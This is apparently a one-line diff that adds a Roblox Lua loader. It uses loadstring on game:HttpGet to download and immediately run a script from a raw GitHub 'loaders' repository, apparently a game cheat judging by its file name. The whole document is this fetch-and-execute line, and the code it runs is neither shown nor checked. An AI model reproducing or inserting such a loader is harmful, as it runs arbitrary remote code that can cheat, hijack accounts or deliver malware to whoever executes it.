@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/fps-flick-spam0-1fpocw9xof4k3m.lua"))()
